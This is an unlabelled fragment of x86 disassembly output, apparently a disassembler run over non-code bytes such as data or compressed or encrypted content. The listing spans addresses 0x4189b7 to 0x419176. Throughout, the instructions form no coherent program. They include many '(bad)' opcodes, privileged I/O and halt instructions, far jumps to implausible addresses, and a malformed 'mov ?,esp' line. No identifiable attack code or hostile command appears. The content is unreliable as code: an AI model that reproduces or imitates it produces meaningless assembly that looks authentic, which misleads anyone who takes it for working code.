  4189b7:	cmp    eax,0xef92e4a7
  4189bc:	shl    DWORD PTR [edi],cl
  4189be:	fiadd  WORD PTR [ecx]
  4189c0:	retf   0x84a7
  4189c3:	out    dx,eax
  4189c4:	inc    edi
  4189c5:	inc    esp
  4189c6:	pop    ss
  4189c7:	(bad)  [esi-0x7691ae31]
  4189cd:	int    0xf
  4189cf:	adc    eax,0xad507c16
  4189d4:	and    edx,ebp
  4189d6:	fcom   DWORD PTR ss:[ebp+0x2c]
  4189da:	rcr    ch,cl
  4189dc:	and    BYTE PTR [ecx-0xf],dh
  4189df:	cmp    eax,0x4f01cbf8
  4189e4:	jne    0x4189c3
  4189e6:	pop    esi
  4189e7:	push   es
  4189e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189e9:	fistp  WORD PTR [esp+esi*4-0x2b]
  4189ed:	out    dx,al
  4189ee:	imul   esi,DWORD PTR [ebx-0x62],0xffffffde
  4189f2:	push   ecx
  4189f3:	pop    ebx
  4189f4:	bound  ecx,QWORD PTR [esp+esi*2-0x1e7a2a85]
  4189fb:	js     0x4189f1
  4189fd:	push   esp
  4189fe:	push   ebx
  4189ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a00:	and    ebx,eax
  418a02:	sub    BYTE PTR [ebx+0x5e],bh
  418a05:	neg    DWORD PTR [edx-0x31387214]
  418a0b:	fimul  WORD PTR [ebx]
  418a0d:	dec    ebp
  418a0e:	add    ebx,eax
  418a10:	nop
  418a11:	sub    edx,esp
  418a13:	std    
  418a14:	push   ebp
  418a15:	jb     0x4189de
  418a17:	push   edx
  418a18:	and    BYTE PTR [ecx],ch
  418a1a:	jle    0x418a68
  418a1c:	jle    0x418a1d
  418a1e:	ss jbe 0x418a22
  418a21:	hlt    
  418a22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a23:	imul   BYTE PTR [edi]
  418a25:	xor    eax,0xf6634d08
  418a2a:	mov    esi,0x78a5f38a
  418a2f:	loope  0x4189f0
  418a31:	fdivp  st(6),st
  418a33:	cmp    cl,bl
  418a35:	aad    0xf6
  418a37:	sar    DWORD PTR [ebx],0x68
  418a3a:	lahf   
  418a3b:	mul    esp
  418a3d:	or     DWORD PTR [ebp+0x441c4d63],esp
  418a43:	and    eax,DWORD PTR cs:[ecx]
  418a46:	fidiv  DWORD PTR [ebp+0x6f7f7e73]
  418a4c:	dec    esi
  418a4d:	jbe    0x418a1e
  418a4f:	mov    eax,ds:0xb5f63d3b
  418a54:	or     al,0xfb
  418a56:	stos   DWORD PTR es:[edi],eax
  418a57:	inc    edx
  418a58:	and    al,BYTE PTR [edx]
  418a5a:	sub    DWORD PTR [edi+edx*4-0x6d],esp
  418a5e:	test   BYTE PTR [eax+0x47277c04],bl
  418a64:	mov    esp,0xad10a1d8
  418a69:	lea    ecx,[edi-0x40]
  418a6c:	lahf   
  418a6d:	sbb    esi,eax
  418a6f:	retf   0x36a5
  418a72:	sub    eax,0x8f306208
  418a77:	ret    
  418a78:	mov    al,ds:0x87a99caa
  418a7d:	pop    ebp
  418a7e:	dec    esi
  418a7f:	addr16 pop ecx
  418a81:	or     BYTE PTR [ebx-0x4e],al
  418a84:	jl     0x418a25
  418a86:	mov    edi,0x937cf7d0
  418a8b:	les    ebp,FWORD PTR [edi-0x559103be]
  418a91:	inc    ebx
  418a92:	clc    
  418a93:	cld    
  418a94:	jbe    0x418a79
  418a96:	push   ebp
  418a97:	ja     0x418a75
  418a99:	push   edx
  418a9a:	loop   0x418a52
  418a9c:	jns    0x418ae5
  418a9e:	mov    bh,0xc7
  418aa0:	sti    
  418aa1:	into   
  418aa2:	les    edi,FWORD PTR [eax-0x522b3c2]
  418aa8:	cmc    
  418aa9:	or     al,0xd4
  418aab:	pushf  
  418aac:	xchg   edi,eax
  418aad:	arpl   WORD PTR [esi+0x6f10e0ac],bx
  418ab3:	iret   
  418ab4:	clc    
  418ab5:	(bad)  
  418ab6:	cmp    DWORD PTR [esi+0x7681a6f1],esi
  418abc:	outs   dx,DWORD PTR ds:[esi]
  418abd:	mov    dl,0x1d
  418abf:	mov    esp,DWORD PTR [ebp+ecx*2-0x10]
  418ac3:	or     edx,DWORD PTR [edx+0x1f8dffc1]
  418ac9:	inc    edi
  418aca:	jmp    0x243a32b2
  418acf:	add    al,0x2e
  418ad1:	and    esp,eax
  418ad3:	std    
  418ad4:	push   ebx
  418ad6:	fcomp  DWORD PTR [eax+eiz*4+0x21]
  418ada:	popf   
  418adb:	cmp    ebp,eax
  418add:	rcr    DWORD PTR [bp+di+0x28bf],0xe7
  418ae3:	shl    DWORD PTR [ebx+ebx*2],0xc2
  418ae7:	outs   dx,BYTE PTR ds:[esi]
  418ae8:	sub    ecx,DWORD PTR [ebp-0x2]
  418aeb:	jg     0x418a7b
  418aed:	ret    
  418aee:	pop    ebx
  418aef:	jge    0x418b13
  418af1:	cmp    dl,BYTE PTR [ebx-0x42]
  418af4:	popf   
  418af5:	sbb    al,0xbe
  418af7:	cmp    eax,0xde648e7d
  418afc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418afd:	mov    bl,0xe
  418aff:	jmp    0x4e93:0x153652be
  418b06:	jnp    0x418b47
  418b08:	into   
  418b09:	test   DWORD PTR [esi],ebx
  418b0b:	xchg   edi,eax
  418b0c:	int3   
  418b0d:	push   ds
  418b0e:	fmul   QWORD PTR [esi-0x114d11c3]
  418b14:	enter  0x6f17,0x91
  418b18:	add    al,0xa8
  418b1a:	mov    bl,0x5d
  418b1c:	mov    es,WORD PTR [ecx+0xa89d8f7]
  418b22:	pushf  
  418b23:	xor    eax,0xba699573
  418b28:	shrd   eax,edi,0x2
  418b2c:	jmp    0x4190b6
  418b31:	xor    DWORD PTR [ecx],0xffffffd8
  418b34:	mov    eax,ds:0x19421898
  418b39:	and    ebp,DWORD PTR [ebx+0x201d72b4]
  418b3f:	push   ds
  418b40:	test   al,0x97
  418b42:	pop    ebx
  418b43:	or     al,0x16
  418b45:	cmp    eax,0x21161604
  418b4a:	xor    ebp,esp
  418b4c:	pop    ds
  418b4d:	and    eax,0x81bcb826
  418b52:	jecxz  0x418bc2
  418b54:	jl     0x418bd4
  418b56:	mov    esp,0xce85ca5
  418b5b:	push   ecx
  418b5c:	and    ecx,DWORD PTR [esi-0x2880f910]
  418b62:	pop    es
  418b63:	(bad)  
  418b64:	sbb    edx,esi
  418b66:	ret    0x6b29
  418b69:	jns    0x418b68
  418b6b:	or     eax,DWORD PTR [edx-0x33fb7186]
  418b71:	(bad)  
  418b72:	jmp    0x418b6f
  418b74:	adc    DWORD PTR [edi+0x6c],eax
  418b77:	adc    eax,0x8fd878d0
  418b7c:	aam    0xfe
  418b7e:	sbb    ebx,DWORD PTR [edx-0x71754aea]
  418b84:	pop    eax
  418b85:	ret    0x2461
  418b88:	aam    0x8
  418b8a:	cld    
  418b8b:	add    BYTE PTR [edi],0xcc
  418b8e:	add    BYTE PTR [ebx-0x75],ah
  418b91:	cdq    
  418b92:	xchg   ebp,eax
  418b93:	mov    ch,0x4e
  418b95:	or     eax,0x142469b5
  418b9a:	mov    ds:0x9d28852e,al
  418b9f:	sbb    bh,bl
  418ba1:	test   al,0x32
  418ba3:	sbb    DWORD PTR [ebx+0x23],esp
  418ba6:	das    
  418ba7:	cdq    
  418ba8:	lahf   
  418ba9:	out    dx,al
  418baa:	loope  0x418b72
  418bac:	neg    DWORD PTR ds:0x12ee7507
  418bb2:	leave  
  418bb3:	shr    WORD PTR [ebx],1
  418bb6:	xchg   ebp,eax
  418bb7:	repz jae 0x418c10
  418bba:	bound  esi,QWORD PTR [edi-0x59]
  418bbd:	push   ecx
  418bbe:	int    0xc3
  418bc0:	or     DWORD PTR [edi],edi
  418bc2:	js     0x418bdd
  418bc4:	loope  0x418bb9
  418bc6:	sub    DWORD PTR [ecx],esp
  418bc8:	aaa    
  418bc9:	push   ds
  418bca:	jbe    0x418b6d
  418bcc:	push   ss
  418bcd:	jmp    0x418c10
  418bcf:	or     eax,0xb71794cb
  418bd4:	mov    ds:0xdd86ee2e,al
  418bd9:	xor    eax,0x17a885b3
  418bde:	sub    BYTE PTR [edi+0x6d],bh
  418be1:	inc    esp
  418be2:	dec    edx
  418be3:	outs   dx,DWORD PTR ds:[esi]
  418be4:	not    BYTE PTR [eax+0x7fa76442]
  418bea:	ss inc edx
  418bec:	stc    
  418bed:	fdivr  DWORD PTR [eax]
  418bef:	push   cs
  418bf0:	pop    ebx
  418bf1:	and    al,BYTE PTR [ebp-0x3]
  418bf4:	icebp  
  418bf5:	hlt    
  418bf6:	call   0xe077a9f2
  418bfb:	sbb    eax,0x17151f57
  418c00:	and    BYTE PTR [edi+0x59a6325c],bl
  418c06:	or     dl,BYTE PTR ds:0xa6ce8c0b
  418c0c:	xor    edi,esi
  418c0e:	addr16 dec ebx
  418c10:	push   ebp
  418c11:	mov    dl,0x79
  418c13:	outs   dx,BYTE PTR ds:[esi]
  418c14:	sub    ebx,DWORD PTR [ebp+0x6f]
  418c17:	bound  ecx,QWORD PTR [ecx+0x34]
  418c1a:	fisttp QWORD PTR [ebx]
  418c1c:	sbb    al,0xcb
  418c1e:	or     eax,DWORD PTR [esi-0x40377f55]
  418c24:	xchg   edi,eax
  418c25:	jo     0x418bdf
  418c27:	mov    BYTE PTR [ecx+0x6b79ee2c],al
  418c2d:	or     dh,dh
  418c2f:	or     BYTE PTR [esi-0x3],bh
  418c32:	inc    esp
  418c33:	jle    0x418bcb
  418c35:	inc    ebp
  418c36:	cld    
  418c37:	mov    ds:0x704c6ec,al
  418c3c:	dec    ebp
  418c3d:	inc    esp
  418c3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c3f:	jg     0x418c80
  418c41:	sbb    dl,BYTE PTR [eax+0x3a]
  418c44:	mov    bl,0x38
  418c46:	lods   eax,DWORD PTR ds:[esi]
  418c47:	dec    ebp
  418c48:	daa    
  418c49:	leave  
  418c4a:	mov    ch,0xca
  418c4c:	inc    esp
  418c4d:	rcr    ecx,0x88
  418c50:	addr16 mov cl,0x49
  418c53:	stos   BYTE PTR es:[edi],al
  418c54:	xlat   BYTE PTR ds:[ebx]
  418c55:	lods   eax,DWORD PTR ds:[esi]
  418c56:	jge    0x418cce
  418c58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c59:	stc    
  418c5a:	dec    esi
  418c5b:	and    BYTE PTR [ebp-0x1940667],dh
  418c61:	push   eax
  418c62:	mov    esi,0x571d95cf
  418c67:	shr    BYTE PTR ds:0xcf119654,1
  418c6d:	xchg   esp,eax
  418c6e:	or     eax,0x972c66ec
  418c73:	sbb    edi,DWORD PTR [edi-0x683c2ad7]
  418c79:	mov    ebx,0xcfd39304
  418c7e:	jmp    0xea53:0xafb73394
  418c85:	addr16 out dx,eax
  418c87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c88:	adc    bl,al
  418c8a:	jl     0x418c91
  418c8c:	push   edi
  418c8d:	mov    bl,0x55
  418c8f:	pop    eax
  418c90:	dec    ecx
  418c91:	icebp  
  418c92:	and    dl,BYTE PTR [edi+0x6e603be3]
  418c98:	clc    
  418c99:	mov    esp,0x3b253015
  418c9e:	jge    0x418cbd
  418ca0:	mov    cl,0x74
  418ca2:	std    
  418ca3:	mov    ch,0x14
  418ca5:	xor    bl,dl
  418ca7:	out    dx,eax
  418ca8:	fnstcw WORD PTR [edx+ebx*1]
  418cab:	mov    dh,0xdf
  418cad:	jecxz  0x418cd4
  418caf:	jle    0x418d0b
  418cb1:	enter  0xbed,0xbb
  418cb5:	and    DWORD PTR [ebx],edi
  418cb7:	mov    al,ds:0x7ef0a7c0
  418cbc:	das    
  418cbd:	test   ebx,edi
  418cbf:	les    esi,FWORD PTR [edi-0xb3c19f7]
  418cc5:	or     al,0xd2
  418cc7:	loop   0x418c53
  418cc9:	push   ebx
  418cca:	xchg   dl,dh
  418ccc:	jl     0x418caa
  418cce:	cwde   
  418ccf:	iret   
  418cd0:	in     al,dx
  418cd1:	pushf  
  418cd2:	mov    ebp,edx
  418cd4:	test   esi,esi
  418cd6:	fld    TBYTE PTR ds:0xcdb89625
  418cdc:	in     al,dx
  418cdd:	ja     0x418d3b
  418cdf:	xchg   ebp,eax
  418ce0:	cdq    
  418ce1:	add    DWORD PTR [edi+0x48],ebp
  418ce4:	mov    esi,DWORD PTR [edi+0x5d]
  418ce7:	xor    DWORD PTR [esi],ebp
  418ce9:	jl     0x418cf0
  418ceb:	aad    0x8c
  418ced:	push   ecx
  418cee:	das    
  418cef:	inc    esp
  418cf0:	jae    0x418d5d
  418cf2:	in     al,dx
  418cf3:	inc    esi
  418cf4:	mov    ecx,0x5e66d217
  418cf9:	adc    DWORD PTR [eax],ecx
  418cfb:	dec    eax
  418cfc:	dec    esp
  418cfd:	mov    ecx,es
  418cff:	sub    eax,0x6f305c0b
  418d04:	push   ss
  418d05:	loope  0x418c96
  418d07:	fld    DWORD PTR [edx-0x4]
  418d0a:	cld    
  418d0b:	and    esi,DWORD PTR [edx]
  418d0d:	in     al,0x68
  418d0f:	loope  0x418d3d
  418d11:	pop    esi
  418d12:	fmul   st,st(3)
  418d14:	loopne 0x418d55
  418d16:	push   edx
  418d17:	scas   al,BYTE PTR es:[edi]
  418d18:	and    bh,bh
  418d1a:	push   cs
  418d1b:	in     eax,dx
  418d1c:	es pop ebp
  418d1e:	dec    esp
  418d1f:	inc    ebp
  418d20:	push   ebx
  418d21:	into   
  418d22:	adc    ebp,esp
  418d24:	enter  0x7cd8,0x61
  418d28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d29:	jle    0x418cd5
  418d2b:	sbb    DWORD PTR [ebx-0x2a],eax
  418d2e:	or     al,0x1b
  418d30:	lea    edi,[ebx-0x41]
  418d33:	test   BYTE PTR [edi-0x1e691f66],ah
  418d39:	arpl   WORD PTR [edi],cx
  418d3b:	xchg   ecx,eax
  418d3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d3d:	pop    ebx
  418d3e:	jecxz  0x418d8e
  418d40:	xchg   edx,eax
  418d41:	ja     0x418d5a
  418d43:	or     ebp,ebx
  418d45:	aaa    
  418d46:	or     DWORD PTR [edi+0x63],esi
  418d49:	mov    dl,0xeb
  418d4b:	mov    ?,esp
  418d4d:	mov    al,0xcd
  418d4f:	sar    bl,cl
  418d51:	inc    ebx
  418d52:	adc    DWORD PTR [eax],eax
  418d54:	add    esi,edx
  418d56:	mov    ds:0x5e014286,al
  418d5b:	push   0xffffff9c
  418d5d:	fisubr DWORD PTR [ebx+0x549cfe34]
  418d63:	cld    
  418d64:	xchg   ebx,eax
  418d65:	dec    esi
  418d66:	(bad)  
  418d67:	rcl    BYTE PTR [edi-0x5a],1
  418d6a:	pop    edi
  418d6b:	mov    edx,0x81c7461f
  418d70:	sbb    BYTE PTR [edi-0x734798ce],al
  418d76:	imul   DWORD PTR [edx]
  418d78:	je     0x418d1f
  418d7a:	jge    0x418d60
  418d7c:	add    esp,DWORD PTR [edi]
  418d7e:	mov    esi,0xc0172659
  418d83:	fcmovnb st,st(1)
  418d85:	fiadd  WORD PTR [ebx+esi*2-0x17f657b6]
  418d8c:	pop    ebp
  418d8d:	pop    ecx
  418d8e:	sub    ecx,DWORD PTR [eax]
  418d90:	xor    esi,DWORD PTR [ebx-0x54]
  418d93:	scas   eax,DWORD PTR es:[edi]
  418d94:	mov    edi,0xd92bc55c
  418d99:	mov    eax,0x9230f8f4
  418d9e:	pop    ebx
  418d9f:	sub    ch,ah
  418da1:	pop    ds
  418da2:	(bad)  
  418da3:	jecxz  0x418d87
  418da5:	xchg   edx,eax
  418da6:	js     0x418ddc
  418da8:	jp     0x418d3a
  418daa:	push   ds
  418dab:	cmp    BYTE PTR [edx+0x30],ah
  418dae:	adc    al,0x14
  418db0:	pop    edi
  418db1:	pop    ds
  418db2:	sbb    DWORD PTR [eax+0x7c538991],0xd7a14277
  418dbc:	pop    fs
  418dbe:	rcr    esi,0x92
  418dc1:	gs push esp
  418dc3:	xor    ebx,eax
  418dc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418dc6:	mov    bh,0xe
  418dc8:	adc    edx,DWORD PTR ds:0xba1a31e4
  418dce:	loop   0x418d8a
  418dd0:	test   BYTE PTR [ebx+0x4b],bl
  418dd3:	gs int3 
  418dd5:	pop    ss
  418dd6:	mov    WORD PTR [ebp-0x2c],ss
  418dd9:	push   0x1f7092be
  418dde:	hlt    
  418ddf:	add    DWORD PTR [eax],esi
  418de1:	cs aas 
  418de3:	mov    edx,0x12db7c9f
  418de8:	test   al,0xa8
  418dea:	ret    0x2ea1
  418ded:	add    bl,dh
  418def:	cmc    
  418df0:	sbb    BYTE PTR [edx-0x6d],0xdc
  418df4:	ss mov dh,0x5c
  418df7:	dec    ebx
  418df8:	mov    ecx,0xc8618d9d
  418dfd:	repnz rcl cl,0x72
  418e01:	aas    
  418e02:	lea    ecx,[eax+esi*8+0x24]
  418e06:	or     DWORD PTR [edx-0x79],esp
  418e09:	sbb    eax,0x8563fa16
  418e0e:	fcomp  QWORD PTR [esi+0x51]
  418e11:	xchg   esi,eax
  418e12:	and    DWORD PTR [ebx+eiz*2+0x52757b07],esi
  418e19:	mov    ah,0xc
  418e1b:	out    0x91,al
  418e1d:	out    0xcd,al
  418e1f:	dec    ebp
  418e20:	cmp    esi,esi
  418e22:	mov    eax,0xdb7d4b65
  418e27:	addr16 pusha 
  418e29:	push   sp
  418e2b:	stos   BYTE PTR es:[edi],al
  418e2c:	jmp    0x1f9fd185
  418e31:	pop    esp
  418e32:	(bad)  
  418e33:	push   edx
  418e34:	pop    ss
  418e35:	mov    dh,0xea
  418e37:	jp     0x418ea1
  418e39:	mov    eax,ds:0x5f093853
  418e3e:	imul   esp,DWORD PTR [ecx+0x3323500c],0x90e0d45e
  418e48:	and    al,0x9a
  418e4a:	mov    esp,0x5222aa1c
  418e4f:	inc    edx
  418e50:	int    0xa2
  418e52:	test   BYTE PTR ds:0x86cf38de,al
  418e58:	or     esp,DWORD PTR [esi+eax*4-0x60]
  418e5c:	pop    ebp
  418e5d:	mov    esi,0xc75e65fb
  418e62:	mov    esi,0x480a8e5d
  418e67:	inc    esi
  418e68:	xchg   esi,eax
  418e69:	mov    ebx,0xd84ff9ee
  418e6e:	cmp    ah,BYTE PTR [eax+0x39]
  418e71:	push   ds
  418e72:	xchg   ebx,eax
  418e73:	stc    
  418e74:	mov    dh,0x46
  418e76:	push   0x8fc95757
  418e7b:	xor    BYTE PTR ds:0xfb6b2a39,dl
  418e81:	pop    edx
  418e82:	pop    esp
  418e83:	push   esp
  418e84:	and    BYTE PTR [ebx-0x72],dl
  418e87:	push   0xffffffa1
  418e89:	xor    cl,ah
  418e8b:	imul   ecx,DWORD PTR [ebp-0x9411f2],0xf6ee74c3
  418e95:	ins    DWORD PTR es:[edi],dx
  418e96:	sub    ebp,0x57
  418e99:	xchg   ecx,eax
  418e9a:	fwait
  418e9b:	in     al,0x5e
  418e9d:	jge    0x418e38
  418e9f:	xchg   edx,eax
  418ea0:	clc    
  418ea1:	aad    0xab
  418ea3:	cs sahf 
  418ea5:	cmp    esi,DWORD PTR [ebx]
  418ea7:	inc    ebx
  418ea8:	add    BYTE PTR [eax-0x5b],al
  418eab:	push   0x7cac9834
  418eb0:	xlat   BYTE PTR ds:[ebx]
  418eb1:	test   BYTE PTR [edi-0x2f17dcf9],ch
  418eb7:	ins    DWORD PTR es:[edi],dx
  418eb8:	jne    0x418ef8
  418eba:	mov    bh,0xac
  418ebc:	adc    DWORD PTR [eax+0x2d5d50a8],ebx
  418ec2:	pop    edx
  418ec3:	cmp    dh,BYTE PTR [ebx+0x27047cf9]
  418ec9:	push   edx
  418eca:	adc    al,0xa2
  418ecc:	cdq    
  418ecd:	js     0x418ec6
  418ecf:	mov    cl,0xf
  418ed1:	popa   
  418ed2:	add    dh,BYTE PTR [edi+0x4ba366]
  418ed8:	ja     0x418f57
  418eda:	add    DWORD PTR ds:0x98307565,eax
  418ee0:	push   esp
  418ee1:	add    bl,BYTE PTR [esi]
  418ee3:	xchg   ecx,eax
  418ee4:	ss mov ebp,0x3958761c
  418eea:	std    
  418eeb:	lea    esp,[esi]
  418eed:	mov    ebx,0x43f847e0
  418ef2:	imul   edx,ebx,0xffffffe8
  418ef5:	aad    0x3a
  418ef7:	sub    BYTE PTR [eax],al
  418ef9:	push   esi
  418efa:	xchg   esi,eax
  418efb:	mov    ah,0xf2
  418efd:	sahf   
  418efe:	out    0xe1,al
  418f00:	inc    eax
  418f01:	out    dx,al
  418f02:	arpl   WORD PTR [esi],di
  418f04:	outs   dx,DWORD PTR ds:[esi]
  418f05:	adc    esi,edi
  418f07:	cmp    dh,ch
  418f09:	lods   al,BYTE PTR ds:[esi]
  418f0a:	push   ss
  418f0b:	mov    BYTE PTR [ebx+eiz*2-0x65],cl
  418f0f:	mov    eax,0x6198d8b1
  418f14:	pop    ecx
  418f15:	mov    al,ds:0x79beefa3
  418f1a:	pop    ebp
  418f1b:	xchg   BYTE PTR [ebp+0x503edfb9],bh
  418f21:	mov    eax,0xc466263e
  418f26:	sahf   
  418f27:	push   ecx
  418f28:	sbb    al,al
  418f2a:	mov    dl,0xc1
  418f2c:	or     DWORD PTR [edx-0x65df3252],0x3e835537
  418f36:	push   0x10651f73
  418f3b:	hlt    
  418f3c:	push   ds
  418f3d:	and    BYTE PTR [eax-0x40793d00],dh
  418f43:	cli    
  418f44:	lods   eax,DWORD PTR ds:[esi]
  418f45:	push   edx
  418f46:	test   DWORD PTR [esi+0x4d3c88b1],ebp
  418f4c:	shr    BYTE PTR [ecx-0x96b12b2],0x9b
  418f53:	xor    eax,ebp
  418f55:	mov    al,0x4a
  418f57:	adc    esi,DWORD PTR [ebx+0x1d7b6cf4]
  418f5d:	out    0xb0,eax
  418f5f:	mov    bl,0xf2
  418f61:	mov    ch,0x3
  418f63:	mov    WORD PTR [ebx],ds
  418f65:	out    dx,eax
  418f66:	call   0x8c52d7a8
  418f6b:	mov    dh,0x2e
  418f6d:	jo     0x418fc7
  418f6f:	addr16 fst st(5)
  418f72:	add    BYTE PTR [edi+0x24],cl
  418f75:	and    eax,0x30013696
  418f7a:	xor    dl,al
  418f7c:	adc    bh,BYTE PTR [edi]
  418f7e:	mov    BYTE PTR [ebx-0x458282dd],al
  418f84:	data16 (bad) 
  418f86:	std    
  418f87:	dec    edi
  418f88:	push   eax
  418f89:	cmp    al,0xe8
  418f8b:	adc    ebx,edx
  418f8d:	mov    eax,0x781f3bd6
  418f92:	dec    ebp
  418f93:	stos   DWORD PTR es:[edi],eax
  418f94:	or     BYTE PTR [ebx+0x11],ch
  418f97:	out    0xc2,al
  418f99:	inc    ecx
  418f9a:	test   BYTE PTR [ebp+ebx*4-0x53678759],ah
  418fa1:	mov    dh,0xa2
  418fa3:	mov    bh,0x20
  418fa5:	fwait
  418fa6:	clc    
  418fa7:	adc    BYTE PTR [esi+ebp*8-0x20],cl
  418fab:	ret    
  418fac:	push   edx
  418fad:	scas   al,BYTE PTR es:[edi]
  418fae:	test   esi,0xcdb9dfe6
  418fb4:	mov    eax,ds:0x7787c804
  418fb9:	retf   
  418fba:	(bad)  
  418fbb:	fadd   DWORD PTR [ebx-0x71]
  418fbe:	call   0x21191af6
  418fc3:	mov    ebp,0x6a18c07c
  418fc8:	mov    dh,0x57
  418fca:	mov    ah,0xdc
  418fcc:	test   al,0xa0
  418fce:	xchg   ebp,eax
  418fcf:	enter  0x7b09,0xae
  418fd3:	(bad)  
  418fd4:	push   edi
  418fd5:	inc    esi
  418fd6:	fs mov dl,0x5e
  418fd9:	sar    ecx,cl
  418fdb:	dec    esp
  418fdc:	loop   0x418fdf
  418fde:	cwde   
  418fdf:	add    edx,DWORD PTR [edx+0x64]
  418fe2:	sbb    cl,bh
  418fe4:	retf   
  418fe5:	fisubr DWORD PTR [eax]
  418fe7:	icebp  
  418fe8:	in     eax,dx
  418fe9:	mov    ch,0xc5
  418feb:	xchg   esi,eax
  418fec:	fild   QWORD PTR [ebp+edx*1-0x67]
  418ff0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ff1:	mov    dh,0xe6
  418ff3:	push   ebx
  418ff4:	add    ch,bh
  418ff6:	adc    al,BYTE PTR [ecx+0x5f27524]
  418ffc:	sub    ecx,0xccb95d2e
  419002:	jmp    DWORD PTR [ebx-0x75b5c4a2]
  419008:	sar    DWORD PTR [eax+0x5f0fc],0x25
  41900f:	sbb    bh,BYTE PTR [ecx]
  419011:	(bad)  
  419012:	icebp  
  419013:	fmul   DWORD PTR [eax]
  419015:	xchg   DWORD PTR ds:0x97c6dd44,ebx
  41901b:	inc    ecx
  41901c:	pop    esp
  41901d:	test   eax,0xe2e0a374
  419022:	push   esp
  419023:	hlt    
  419024:	push   ds
  419025:	inc    ecx
  419026:	out    dx,eax
  419027:	or     edi,0xf1febe28
  41902d:	add    bh,BYTE PTR ds:0x4e9b855c
  419033:	aad    0xbd
  419035:	cmp    eax,0x8ae5171b
  41903a:	sub    esi,DWORD PTR [eax-0x301565d3]
  419040:	out    dx,al
  419041:	mov    ebp,0xc5118813
  419046:	xor    esp,edx
  419048:	dec    ecx
  419049:	jecxz  0x4190c6
  41904b:	adc    eax,0xb94fe15f
  419050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419051:	add    al,0xbf
  419053:	xor    eax,edi
  419055:	scas   eax,DWORD PTR es:[edi]
  419056:	inc    esi
  419057:	jns    0x41902f
  419059:	xchg   edx,eax
  41905a:	clc    
  41905b:	or     al,0xf2
  41905d:	(bad)  
  41905e:	popa   
  41905f:	add    dl,bl
  419061:	and    al,0x30
  419063:	adc    DWORD PTR [ebx+0x71372817],edi
  419069:	iret   
  41906a:	fidiv  WORD PTR [edi]
  41906c:	fwait
  41906d:	cmp    al,0x3f
  41906f:	inc    BYTE PTR [ecx-0x7ff7c63b]
  419075:	fst    QWORD PTR [ecx+0x45]
  419078:	in     al,dx
  419079:	push   0xfd65c9c2
  41907e:	jo     0x4190c3
  419080:	jnp    0x41900c
  419082:	lea    esp,[edx+ecx*4+0x55]
  419086:	scas   al,BYTE PTR es:[edi]
  419087:	gs inc edi
  419089:	fnsave [eax-0x3138ce81]
  41908f:	ret    0xccc0
  419092:	push   ebx
  419093:	aam    0x8c
  419095:	pop    ds
  419096:	cmc    
  419097:	push   ebx
  419098:	mov    ebx,0xda097bf9
  41909d:	dec    edi
  41909e:	(bad)  
  4190a0:	push   0xef293df4
  4190a5:	int3   
  4190a6:	mov    DWORD PTR [ebp+0x34],edi
  4190a9:	adc    esp,ebx
  4190ab:	(bad)  [edx+0x2e]
  4190ae:	mov    eax,0xaab41ea0
  4190b3:	shr    DWORD PTR [esi-0x3e36ccb0],1
  4190b9:	out    dx,eax
  4190ba:	add    cl,BYTE PTR [ebx]
  4190bc:	jge    0x4190d2
  4190be:	or     eax,ecx
  4190c0:	cmp    edx,eax
  4190c2:	jne    0x41965b
  4190c8:	cmp    DWORD PTR [ebp+0xc],edi
  4190cb:	jmp    0x419655
  4190d0:	arpl   WORD PTR [edi+0x1f],di
  4190d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190d4:	adc    esp,DWORD PTR [esi+0x24f3262]
  4190da:	xchg   esi,eax
  4190db:	outs   dx,BYTE PTR ds:[esi]
  4190dc:	push   cs
  4190dd:	xor    eax,0x59bc7272
  4190e2:	or     al,0x16
  4190e4:	cmp    eax,0xf3161604
  4190e9:	mov    ebx,0xd5a5e658
  4190ee:	aam    0x6e
  4190f0:	xchg   edx,eax
  4190f1:	ins    DWORD PTR es:[edi],dx
  4190f2:	sub    DWORD PTR [edi+0x5f],esi
  4190f5:	pop    eax
  4190f6:	mov    dl,0x6a
  4190f8:	call   DWORD PTR [ebx]
  4190fa:	add    edx,DWORD PTR [ecx]
  4190fc:	adc    eax,0x40693c3f
  419101:	or     ebx,DWORD PTR [esi+0xc]
  419104:	pop    esp
  419105:	dec    eax
  419106:	cmp    edi,DWORD PTR [edx-0x6ad078c8]
  41910c:	in     al,0xb2
  41910e:	jmp    0x419093
  419110:	sub    al,0xad
  419112:	jnp    0x4190f6
  419114:	cwde   
  419115:	xchg   ebp,eax
  419116:	out    0x16,al
  419118:	push   cs
  419119:	adc    dh,BYTE PTR [esi-0x49152d36]
  41911f:	enter  0x440a,0x29
  419123:	push   DWORD PTR [eax+0xb284f8a]
  419129:	(bad)  
  41912a:	pop    esp
  41912b:	cmp    al,0x7b
  41912d:	add    BYTE PTR ds:0x5741aec,cl
  419133:	pop    esp
  419134:	and    al,0x60
  419136:	or     BYTE PTR [edi+0x2801039a],0xdd
  41913d:	mov    al,0xd1
  41913f:	jg     0x4190e5
  419141:	popa   
  419142:	xchg   edi,eax
  419143:	push   edx
  419144:	or     dl,BYTE PTR [edx+0x22c17076]
  41914a:	and    al,0xb2
  41914c:	pushf  
  41914d:	shl    BYTE PTR [ebx-0x2],cl
  419150:	xchg   edx,eax
  419151:	(bad)  
  419152:	push   cs
  419153:	(bad)  
  419154:	xchg   edi,eax
  419155:	dec    esp
  419156:	xor    dl,BYTE PTR [ebx-0x21b6303]
  41915c:	push   edi
  41915d:	in     al,dx
  41915e:	adc    esi,0x5f
  419161:	xchg   ecx,eax
  419162:	mov    BYTE PTR [esi+0x7a],cl
  419165:	gs pop ecx
  419167:	jmp    DWORD PTR [eax-0x4eaf2f0e]
  41916d:	and    BYTE PTR [ecx+0x14],dh
  419170:	lahf   
  419171:	pop    esp
  419172:	jecxz  0x419157
  419174:	js     0x419115
  419176:	into   
